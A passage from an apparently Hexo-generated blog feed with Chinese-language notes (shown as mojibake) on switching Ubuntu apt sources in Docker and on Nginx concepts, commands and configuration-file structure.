    <content type="html"><![CDATA[<p><a href="https://pkgs.org/download/ca-certificates">ä¸‹è½½è¯ä¹¦çš„ç½‘ç«™</a><br><a href="https://installati.one/ubuntu/20.04/ca-certificates/">å‚è€ƒ</a><br>å…ˆç”¨åŸæœ¬çš„ä»“åº“å®‰è£… <code>ca-certificates</code> (è‹¥å…ˆæ¢äº†æº, å°±ä¼šæ‰¾ä¸åˆ°å®‰è£…åŒ…):</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> -y install ca-certificates<br></code></pre></td></tr></table></figure><p>ç„¶åå†æ¢æºå’Œæ›´æ–°:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sed</span> -i <span class="hljs-string">&quot;s<span class="hljs-variable">@http</span>://.*archive.ubuntu.com<span class="hljs-variable">@https</span>://mirrors.tuna.tsinghua.edu.cn<span class="hljs-variable">@g</span>&quot;</span> /etc/apt/sources.list<br>sed -i <span class="hljs-string">&quot;s<span class="hljs-variable">@http</span>://.*security.ubuntu.com<span class="hljs-variable">@https</span>://mirrors.tuna.tsinghua.edu.cn<span class="hljs-variable">@g</span>&quot;</span> /etc/apt/sources.list<br>apt-get update<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx çŸ¥è¯†ç‚¹</title>
    <link href="/2022/08/28/Nginx-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/08/28/Nginx-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.nginx.cn/doc/">ä¸­æ–‡æ–‡æ¡£</a></p><p><a href="https://nginx.org/en/docs/">è‹±æ–‡æ–‡æ¡£</a></p><p><a href="http://nginx.org/en/docs/">å®˜ç½‘ç›¸å…³æ•™ç¨‹å’Œèµ„æ–™</a></p><p>å‚è€ƒä¹¦ç±: &lt;&lt;Nginx æœåŠ¡å™¨æ¶æ„åˆæ¢&gt;&gt;, &lt;&lt;Nginx-é«˜æ€§èƒ½-Web-æœåŠ¡å™¨è¯¦è§£&gt;&gt;, &lt;&lt;Nginx-é«˜æ€§èƒ½-Web-æœåŠ¡å™¨å®æˆ˜æ•™ç¨‹&gt;&gt;, &lt;&lt;é«˜æ€§èƒ½ Linux æœåŠ¡å™¨ æ„å»ºå®æˆ˜&gt;&gt;</p><p><a href="https://wiki.archlinux.org/title/Nginx">ArchWiki ä¸Šç›¸å…³èµ„æ–™</a></p><p><a href="https://www.digitalocean.com/community/tutorials/understanding-the-nginx-configuration-file-structure-and-configuration-contexts">è°·æ­Œæ‰¾åˆ°çš„æ–‡æ¡£</a></p><p><a href="https://www.zhihu.com/question/502134901/answer/2598585626?utm_medium=social&utm_oi=1215946114580484096&utm_psn=1559612920740134912&utm_source=qq">çŸ¥ä¹æŸ¥è¯¢èµ„æ–™</a></p><h1 id="ä¸€äº›ç†è®ºæ¦‚å¿µ"><a href="#ä¸€äº›ç†è®ºæ¦‚å¿µ" class="headerlink" title="ä¸€äº›ç†è®ºæ¦‚å¿µ"></a>ä¸€äº›ç†è®ºæ¦‚å¿µ</h1><h2 id="åŒæ­¥å’Œå¼‚æ­¥ï¼Œé˜»å¡å’Œéé˜»å¡"><a href="#åŒæ­¥å’Œå¼‚æ­¥ï¼Œé˜»å¡å’Œéé˜»å¡" class="headerlink" title="åŒæ­¥å’Œå¼‚æ­¥ï¼Œé˜»å¡å’Œéé˜»å¡"></a>åŒæ­¥å’Œå¼‚æ­¥ï¼Œé˜»å¡å’Œéé˜»å¡</h2><h3 id="åŒæ­¥å’Œå¼‚æ­¥"><a href="#åŒæ­¥å’Œå¼‚æ­¥" class="headerlink" title="åŒæ­¥å’Œå¼‚æ­¥"></a>åŒæ­¥å’Œå¼‚æ­¥</h3><ul><li>åŒæ­¥, å½“ä¸€ä¸ªåŒæ­¥è°ƒç”¨å‘å‡ºå»åï¼Œè°ƒç”¨è€…è¦ä¸€ç›´ç­‰å¾…è°ƒç”¨çš„ç»“æœé€šçŸ¥åï¼Œæ‰èƒ½è¿›è¡Œåç»­çš„æ‰§è¡Œ</li><li>å¼‚æ­¥ï¼Œå½“ä¸€ä¸ªå¼‚æ­¥è°ƒç”¨å‘å‡ºå»åï¼Œè°ƒç”¨è€…ä¸éœ€è¦ä¸€ç›´ç­‰å¾…è°ƒç”¨ç»“æœçš„è¿”å›ï¼Œå…¶æƒ³è¦è·å–è°ƒç”¨ç»“æœä¸€èˆ¬é‡‡å–ä¸¤ç§æ–¹å¼<ol><li>ä¸»åŠ¨è½®è¯¢å¼‚æ­¥è°ƒç”¨ç»“æœ</li><li>è¢«è°ƒç”¨æ–¹é€šè¿‡ callback æ¥é€šçŸ¥</li></ol></li></ul><h3 id="é˜»å¡å’Œéé˜»å¡"><a href="#é˜»å¡å’Œéé˜»å¡" class="headerlink" title="é˜»å¡å’Œéé˜»å¡"></a>é˜»å¡å’Œéé˜»å¡</h3><ul><li>é˜»å¡ï¼Œè°ƒç”¨åœ¨å‘å‡ºåï¼Œåœ¨æ¶ˆæ¯è¿”å›å‰ï¼Œå½“å‰çº¿&#x2F;è¿›ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œç›´åˆ°æœ‰æ¶ˆæ¯è¿”å›ï¼Œå½“å‰çº¿&#x2F;è¿›ç¨‹æ‰ä¼šè¢«æ¿€æ´»</li><li>éé˜»å¡ï¼Œè°ƒç”¨åœ¨å‘å‡ºå»åï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿&#x2F;è¿›ç¨‹ï¼Œè€Œä¼šç«‹å³è¿”å›</li></ul><p>nginx é‡‡ç”¨å¼‚æ­¥éé˜»å¡æ–¹å¼å·¥ä½œã€‚</p><h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><p>å½“è¿æ¥æœ‰ I&#x2F;O äº§ç”Ÿæ—¶ï¼Œepoll å°±ä¼šå‘Šè¯‰è¿›ç¨‹å“ªä¸ªè¿æ¥æœ‰ I&#x2F;O äº‹ä»¶ï¼Œç„¶åè¿›ç¨‹å°±ä¼šå»å¤„ç†è¿™ä¸ªäº‹ä»¶ã€‚å…¶è®© nginx æœ‰é«˜å¹¶å‘, å³åŒæ—¶å¤„ç†å¤šä¸ªè¿æ¥.</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>nginx (engine x) æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ HTTP å’Œåå‘ä»£ç†æœåŠ¡å™¨, åŒæ—¶ä¹Ÿæä¾› IMAP å’Œ SMTP æœåŠ¡ã€‚å…¶ç‰¹ç‚¹æ˜¯å ç”¨å†…å­˜å°‘ï¼Œå¹¶å‘èƒ½åŠ›å¼ºã€‚</p><h2 id="å·¥ä½œæ¨¡å¼"><a href="#å·¥ä½œæ¨¡å¼" class="headerlink" title="å·¥ä½œæ¨¡å¼"></a>å·¥ä½œæ¨¡å¼</h2><p>ä¸¤ç§å·¥ä½œæ¨¡å¼.</p><h3 id="master-worker-æ¨¡å¼"><a href="#master-worker-æ¨¡å¼" class="headerlink" title="master-worker æ¨¡å¼"></a>master-worker æ¨¡å¼</h3><p>æœ‰ä¸€ä¸ª master è¿›ç¨‹å’Œè‡³å°‘ä¸€ä¸ª worker è¿›ç¨‹ã€‚</p><p>master è¿›ç¨‹è´Ÿè´£å¤„ç†ç³»ç»Ÿä¿¡å·ï¼Œç®¡ç† worker è¿›ç¨‹ã€‚</p><p>worker è¿›ç¨‹è´Ÿè´£å¤„ç†å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p>å¸¸ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚</p><h3 id="å•è¿›ç¨‹æ¨¡å¼"><a href="#å•è¿›ç¨‹æ¨¡å¼" class="headerlink" title="å•è¿›ç¨‹æ¨¡å¼"></a>å•è¿›ç¨‹æ¨¡å¼</h3><p>åªæœ‰ä¸€ä¸ªè¿›ç¨‹.</p><p>æ–¹ä¾¿ä½¿ç”¨ gdb ç­‰å·¥å…·è¿›è¡Œè°ƒè¯•ã€‚</p><p>ä¸€èˆ¬ç”¨äºå¼€å‘é˜¶æ®µå’Œè°ƒè¯•ã€‚</p><p>Nginx è¯»ä½œ engine X, å¯ä»¥åš HTTP æœåŠ¡å™¨, åå‘ä»£ç†, IMAP&#x2F;POP3 ä»£ç†æœåŠ¡å™¨.</p><h2 id="æ¨¡å—åŒ–"><a href="#æ¨¡å—åŒ–" class="headerlink" title="æ¨¡å—åŒ–"></a>æ¨¡å—åŒ–</h2><p>Nginx å¯ä»¥é€šè¿‡æ¨¡å—æ¥æ‰©å±•åŠŸèƒ½. å°±åƒ vim è£…æ’ä»¶.</p><p>ä¸€èˆ¬åˆ†ä¸º:</p><ul><li>æ ¸å¿ƒæ¨¡å—</li><li>æ ‡å‡† HTTP æ¨¡å—</li><li>å¯é€‰ HTTP æ¨¡å—</li><li>é‚®ä»¶æœåŠ¡æ¨¡å—</li><li>ç¬¬ä¸‰æ–¹æ¨¡å—</li></ul><p>æ·»åŠ çš„æ¨¡å—æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´.</p><p>æ ¸å¿ƒæ¨¡å—å’Œæ ‡å‡† HTTP æ¨¡å—åœ¨ Nginx å¿«é€Ÿç¼–è¯‘åå°±åŒ…å«åœ¨ Nginx ä¸­.</p><p>åœ¨æˆ‘è£…å¾— docker å®¹å™¨ (Ubuntu 18.04) é‡Œ, æ¨¡å—ä½äº <code>/usr/lib/nginx/modules</code> è¿™ä¸ªç›®å½•.</p><h2 id="åŠŸèƒ½-ä½¿ç”¨æ–¹å‘"><a href="#åŠŸèƒ½-ä½¿ç”¨æ–¹å‘" class="headerlink" title="åŠŸèƒ½, ä½¿ç”¨æ–¹å‘"></a>åŠŸèƒ½, ä½¿ç”¨æ–¹å‘</h2><h3 id="æ­£å‘ä»£ç†å’Œåå‘ä»£ç†"><a href="#æ­£å‘ä»£ç†å’Œåå‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç†å’Œåå‘ä»£ç†"></a>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†</h3><p>æ­£å‘ä»£ç†, ä»£ç†å®¢æˆ·ç«¯. å®¢æˆ·ç«¯çš„è¯·æ±‚ä»ä»£ç†å¤„å‘ç»™æœåŠ¡å™¨.</p><p>åå‘ä»£ç†, ä»£ç†æœåŠ¡ç«¯. å°±å¦‚åŒå‘æˆ‘ä»¬å‘ <code>www.baidu.com</code> è®¿é—®, åªæœ‰è¿™ä¸€ä¸ªåŸŸå, å®é™…ä¸Šåé¢æœ‰å¾ˆå¤šæœåŠ¡å™¨.</p><h3 id="è´Ÿè½½å‡è¡¡"><a href="#è´Ÿè½½å‡è¡¡" class="headerlink" title="è´Ÿè½½å‡è¡¡"></a>è´Ÿè½½å‡è¡¡</h3><p>è½®å¾ª, ä¸€ä¸ªä¸€ä¸ªåˆ†é…è¯·æ±‚.</p><p>åŠ æƒè½®å¾ª, é€šè¿‡æƒé‡æ¥åˆ†é…è¯·æ±‚.</p><h3 id="iphash"><a href="#iphash" class="headerlink" title="iphash"></a>iphash</h3><p>æ¥è‡ªä¸€ä¸ª ip çš„è¯·æ±‚ä¼šå§‹ç»ˆä¼ é€åˆ°åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Š (è§£å†³ä¼šè¯æ— æ³•å…±äº«å¯¼è‡´çš„é—®é¢˜).</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>åšç¼“å­˜æœåŠ¡å™¨ä»¥åŠ Session å…±äº«.</p><h3 id="é™æ€èµ„æºæœåŠ¡å™¨"><a href="#é™æ€èµ„æºæœåŠ¡å™¨" class="headerlink" title="é™æ€èµ„æºæœåŠ¡å™¨"></a>é™æ€èµ„æºæœåŠ¡å™¨</h3><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®‰è£… <code>nginx-mainline</code> åŒ…æˆ– <code>nginx</code> åŒ….</p><p>nginx-mainline çš„æ¨¡å—å¯ä»¥åœ¨ AUR ä¸Šæ‰¾åˆ°.</p><p>å¯æŸ¥é˜… â€œæˆ‘çš„ç¬¬ä¸€æœ¬ Docker ä¹¦â€.</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>ç›´æ¥ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nginx<br></code></pre></td></tr></table></figure><p>æ¥æ‰“å¼€.</p><p>å½“ nginx æ‰“å¼€å, å¯ä»¥ç”¨ <code>-s</code> é€‰é¡¹æ§åˆ¶, å¦‚:</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">nginx -s <span class="hljs-keyword">signal</span><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª signal æœ‰ä»¥ä¸‹å‡ ç§:</p><ul><li>stop</li><li>quit</li><li>reload, é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶</li><li>reopen, é‡æ–°æ‰“å¼€ log files</li></ul><p>åœ¨ <code>nginx -s reload</code> ä¹‹å, è‹¥é…ç½®æ–‡ä»¶æ­£ç¡®, å…¶ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ worker processes ç„¶åå‘ old worker processes å‘é€ä¿¡å·, è¦æ±‚å…¶å…³é—­, ä½†å®ƒä¸ä¼šç«‹å³å…³é—­, å…¶ä¼š stop accepting new connections and continue to service current requests until all such requests are serviced.</p><p>nginx master process çš„ PID è®°å½•åœ¨ <code>/usr/local/nginx/logs/</code> æˆ– <code>/var/run/</code> ä¸‹çš„ <code>nginx.pid</code> æ–‡ä»¶ä¸­. å¯ä»¥ä½¿ç”¨ kill å‘½ä»¤å’Œ nginx äº¤äº’.</p><p>å’Œ control ç›¸å…³çš„ <a href="http://nginx.org/en/docs/control.html">ç½‘ç«™</a></p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><h2 id="é…ç½®æ–‡ä»¶ä½ç½®"><a href="#é…ç½®æ–‡ä»¶ä½ç½®" class="headerlink" title="é…ç½®æ–‡ä»¶ä½ç½®"></a>é…ç½®æ–‡ä»¶ä½ç½®</h2><p>nginx çš„é…ç½®æ–‡ä»¶ä¸º <code>nginx.conf</code>, è·¯å¾„ä¸º:</p><ul><li><code>/usr/local/nginx/conf</code></li><li><code>/etc/nginx/</code></li><li><code>/usr/local/etc/nginx</code></li></ul><h2 id="æ•´ä½“ç»“æ„"><a href="#æ•´ä½“ç»“æ„" class="headerlink" title="æ•´ä½“ç»“æ„"></a>æ•´ä½“ç»“æ„</h2><p><img src="/../img/file_structure.png" alt="Nginx é…ç½®æ–‡ä»¶ç»“æ„"></p><p>ç»„æˆ Nginx çš„æ¨¡å—ç”±é…ç½®æ–‡ä»¶ä¸­çš„ directive æ§åˆ¶. directives è¢«åˆ†æˆ simple directives å’Œ block directives.</p><p>ä¸€ä¸ª simple directive ç”± name å’Œ parameters, ä¸”ç”¨ <code>;</code> åˆ†éš”ç»„æˆ.</p><p>ä¸€ä¸ª block directive å’Œ simple directive æœ‰ç›¸åŒçš„ç»“æ„, ä½†æ˜¯ç”¨ <code>&#123;&#125;</code> åŒ…è£¹.</p><p>ä¸€ä¸ª block directive é‡Œé¢å¯ä»¥æœ‰å…¶ä»–çš„ directive, å«åš context, å¦‚ events, http, server, location.</p><p>å¦‚æœæœ‰çš„ directives æ”¾åœ¨ä»»ä½• context å¤–é¢, å°±å«åš main context.</p><p><code>#</code> è¡¨æ˜æ³¨é‡Š.</p><p>Nginx é…ç½®æ–‡ä»¶ä¸»è¦åˆ†æˆå››ä¸ªéƒ¨åˆ†: main (å…¨å±€è®¾ç½®), server (ä¸»æœºè®¾ç½®), upstream (è´Ÿè½½å‡è¡¡æœåŠ¡å™¨è®¾ç½®) å’Œ location (URL åŒ¹é…ç‰¹å®šä½ç½®çš„è®¾ç½®). è¿™äº›æ˜¯è®¾ç½®çš„å—åŒºåŸŸ.</p><p>main éƒ¨åˆ† (ä¹Ÿå°±æ˜¯åœ¨æ‰€æœ‰çš„å—ä¹‹å¤–çš„éƒ¨åˆ†) è®¾ç½®çš„å‘½ä»¤å°†å½±å“å…¶ä»–æ‰€æœ‰è®¾ç½®.</p><p>server éƒ¨åˆ†çš„å‘½ä»¤ä¸»è¦ç”¨äºæŒ‡å®šä¸»æœºå’Œç«¯å£.<br>é•¿è¿™æ ·:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>    xx;<br>    <span class="hljs-attribute">server_name</span>  xxx<br>&#125;<br></code></pre></td></tr></table></figure><p>location éƒ¨åˆ†ç”¨äºåŒ¹é…ç½‘é¡µä½ç½®. ä¸€èˆ¬æ”¾åœ¨ server å—é‡Œé¢:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span> &#123;<br>    <span class="hljs-keyword">listen</span>    xx;<br>    server_name  xxx<br><br>    <span class="hljs-keyword">location</span> / &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>upstream å‘½ä»¤ä¸»è¦ç”¨äºè´Ÿè½½å‡è¡¡, è®¾ç½®ä¸€ç³»åˆ—çš„åç«¯æœåŠ¡å™¨, ä¸€èˆ¬æ”¾åœ¨ server å—ä¹‹å, å’Œ location ä¸­çš„ <code>proxy_pass</code> é…åˆä½¿ç”¨:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span> &#123;<br>    <span class="hljs-keyword">listen</span>    xx;<br>    server_name  xxx<br><br>    <span class="hljs-keyword">location</span> / &#123;<br>        proxy_pass [<span class="hljs-keyword">server</span>];<br>    &#125;<br>&#125;<br><br>upstream [<span class="hljs-keyword">server</span>] &#123;<br>    <span class="hljs-keyword">server</span> xxx;<br>    <span class="hljs-keyword">server</span> xxx;<br>    <span class="hljs-keyword">server</span> xxx;<br>&#125;<br></code></pre></td></tr></table></figure><p>server ç»§æ‰¿ main, location ç»§æ‰¿ server, upstream æ—¢ä¸ä¼šç»§æ‰¿å…¶ä»–è®¾ç½®, ä¹Ÿä¸ä¼šè¢«ç»§æ‰¿.</p><h2 id="ç»†åˆ†æ¯ä¸€ä¸ª-block-çš„é…ç½®å’Œå¸¸ç”¨é€‰é¡¹"><a href="#ç»†åˆ†æ¯ä¸€ä¸ª-block-çš„é…ç½®å’Œå¸¸ç”¨é€‰é¡¹" class="headerlink" title="ç»†åˆ†æ¯ä¸€ä¸ª block çš„é…ç½®å’Œå¸¸ç”¨é€‰é¡¹"></a>ç»†åˆ†æ¯ä¸€ä¸ª block çš„é…ç½®å’Œå¸¸ç”¨é€‰é¡¹</h2><h3 id="main-ä¹Ÿå°±æ˜¯æ‰€æœ‰-block-ä¹‹å¤–"><a href="#main-ä¹Ÿå°±æ˜¯æ‰€æœ‰-block-ä¹‹å¤–" class="headerlink" title="main ä¹Ÿå°±æ˜¯æ‰€æœ‰ block ä¹‹å¤–"></a>main ä¹Ÿå°±æ˜¯æ‰€æœ‰ block ä¹‹å¤–</h3><p>æ•´ä½“ä¸€èˆ¬å†™è¿™äº›, åé¢æœ‰å•ä¸ªè®²è§£:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">user user [<span class="hljs-keyword">group</span>];<br>worker_processes <span class="hljs-number">4</span>;<br>worker_rlimit_nofile <span class="hljs-number">51200</span>;<br>access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br>pid <span class="hljs-regexp">/run/</span>nginx.pid;<br>daemon on;<br></code></pre></td></tr></table></figure><h4 id="è®¾ç½®-worker-processes-çš„æƒé™"><a href="#è®¾ç½®-worker-processes-çš„æƒé™" class="headerlink" title="è®¾ç½® worker_processes çš„æƒé™."></a>è®¾ç½® <code>worker_processes</code> çš„æƒé™.</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">user</span> [group];<br></code></pre></td></tr></table></figure><p>Nginx æœåŠ¡å™¨ä¸­ä¸»è¿›ç¨‹ (master process) æ˜¯ä»¥ root æƒé™è¿è¡Œçš„.</p><p>è¿™é‡Œè®¾ç½®ç”¨æˆ·å’Œç»„æ˜¯é’ˆå¯¹å·¥ä½œè¿›ç¨‹ (worker process).</p><p>Nginx æä¾›ä¸¤ç§è®¾ç½®ç”¨æˆ·å’Œç»„çš„æ–¹å¼:</p><ul><li>å®‰è£…æ—¶é€šè¿‡ç¼–è¯‘é€‰é¡¹è¿›è¡Œè®¾ç½®</li><li>ä¿®æ”¹é…ç½®æ–‡ä»¶</li></ul><p>ä¸»è¿›ç¨‹æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚, è½¬äº¤ç»™å·¥ä½œè¿›ç¨‹å¤„ç†.</p><p><code>group</code> å¿½ç•¥ä¸å†™æ—¶, ç”¨å’Œ <code>user</code> ç›¸åŒçš„åå­—ä»£æ›¿.</p><p>nginx ä¼¼ä¹æ˜¯å±äº <code>www-data</code> è¿™ä¸ªç”¨æˆ·ç»„çš„.</p><h4 id="è®¾ç½®å¼€å¯çš„è¿›ç¨‹æ•°"><a href="#è®¾ç½®å¼€å¯çš„è¿›ç¨‹æ•°" class="headerlink" title="è®¾ç½®å¼€å¯çš„è¿›ç¨‹æ•°"></a>è®¾ç½®å¼€å¯çš„è¿›ç¨‹æ•°</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">worker_processes <span class="hljs-number">4</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>worker_processes</code>, å…¶å€¼å†³å®šäº† nginx æ¥å—å¤šå°‘è¿æ¥å’Œå®ƒä¼šä½¿ç”¨å¤šå°‘å¤„ç†å™¨, è‹¥è®¾ç½®ä¸º <code>auto</code>, å®ƒä¼šè‡ªåŠ¨æ£€æµ‹æœ€ä¼˜å€¼.</p><h4 id="è®¾ç½®æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æ•°ç›®"><a href="#è®¾ç½®æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æ•°ç›®" class="headerlink" title="è®¾ç½®æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æ•°ç›®"></a>è®¾ç½®æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æ•°ç›®</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">worker_rlimit_nofile <span class="hljs-number">51200</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå€¼å’Œ <code>ulimit -n</code> çš„è¾“å‡ºæœ€å¥½ä¿æŒä¸€è‡´.</p><h4 id="è®¾ç½®å…¨å±€çš„-access-log-å’Œ-error-log"><a href="#è®¾ç½®å…¨å±€çš„-access-log-å’Œ-error-log" class="headerlink" title="è®¾ç½®å…¨å±€çš„ access_log å’Œ error_log"></a>è®¾ç½®å…¨å±€çš„ <code>access_log</code> å’Œ <code>error_log</code></h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br></code></pre></td></tr></table></figure><p>åé¢è·Ÿçš„æ˜¯è·¯å¾„.</p><h4 id="è®¾ç½®-pid-å­˜æ”¾ä½ç½®"><a href="#è®¾ç½®-pid-å­˜æ”¾ä½ç½®" class="headerlink" title="è®¾ç½® pid å­˜æ”¾ä½ç½®"></a>è®¾ç½® pid å­˜æ”¾ä½ç½®</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pid <span class="hljs-regexp">/run/</span>nginx.pid;<br></code></pre></td></tr></table></figure><h4 id="è®¾ç½®æ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼"><a href="#è®¾ç½®æ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼" class="headerlink" title="è®¾ç½®æ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼"></a>è®¾ç½®æ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">daemon</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><p><code>daemon off;</code> è¡¨ç¤ºä»¥éå®ˆæŠ¤è¿›ç¨‹æ¨¡å¼è¿è¡Œ. é˜»æ­¢ nginx è¿›å…¥åå°. å…¶å¯ä»¥ä¿æŒ Docker å®¹å™¨çš„æ´»è·ƒçŠ¶æ€.</p><h3 id="events-å—"><a href="#events-å—" class="headerlink" title="events å—"></a>events å—</h3><p>å…¶è®¾ç½® Nginx çš„å·¥ä½œæ¨¡å¼ä»¥åŠè¿æ¥æ•°ä¸Šé™.</p><p>é•¿è¿™æ ·:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">events</span> &#123;<br>    <span class="hljs-attribute">use</span> <span class="hljs-literal">epoll</span>;<br>    <span class="hljs-attribute">worker_connections</span> <span class="hljs-number">51200</span>;<br>    <span class="hljs-attribute">multi_accept</span> <span class="hljs-literal">off</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è®¾ç½®-Nginx-çš„å·¥ä½œæ¨¡å¼"><a href="#è®¾ç½®-Nginx-çš„å·¥ä½œæ¨¡å¼" class="headerlink" title="è®¾ç½® Nginx çš„å·¥ä½œæ¨¡å¼"></a>è®¾ç½® Nginx çš„å·¥ä½œæ¨¡å¼</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">use</span> <span class="hljs-literal">epoll</span>;<br></code></pre></td></tr></table></figure><p>å¯¹äº Linux ç³»ç»Ÿ, epoll å·¥ä½œæ¨¡å¼æ˜¯é¦–é€‰.</p><h4 id="è®¾ç½®-worker-process-è¿›ç¨‹çš„æœ€å¤§å¹¶å‘é“¾æ¥æ•°"><a href="#è®¾ç½®-worker-process-è¿›ç¨‹çš„æœ€å¤§å¹¶å‘é“¾æ¥æ•°" class="headerlink" title="è®¾ç½® worker process è¿›ç¨‹çš„æœ€å¤§å¹¶å‘é“¾æ¥æ•°"></a>è®¾ç½® worker process è¿›ç¨‹çš„æœ€å¤§å¹¶å‘é“¾æ¥æ•°</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">worker_connections <span class="hljs-number">51200</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>woker_connection</code> å®šä¹‰çš„æ˜¯ Nginx æ¯ä¸ªè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°.</p><h4 id="è®¾ç½®æ˜¯ä¸²è¡Œè¿˜æ˜¯å¹¶è¡Œ"><a href="#è®¾ç½®æ˜¯ä¸²è¡Œè¿˜æ˜¯å¹¶è¡Œ" class="headerlink" title="è®¾ç½®æ˜¯ä¸²è¡Œè¿˜æ˜¯å¹¶è¡Œ"></a>è®¾ç½®æ˜¯ä¸²è¡Œè¿˜æ˜¯å¹¶è¡Œ</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span 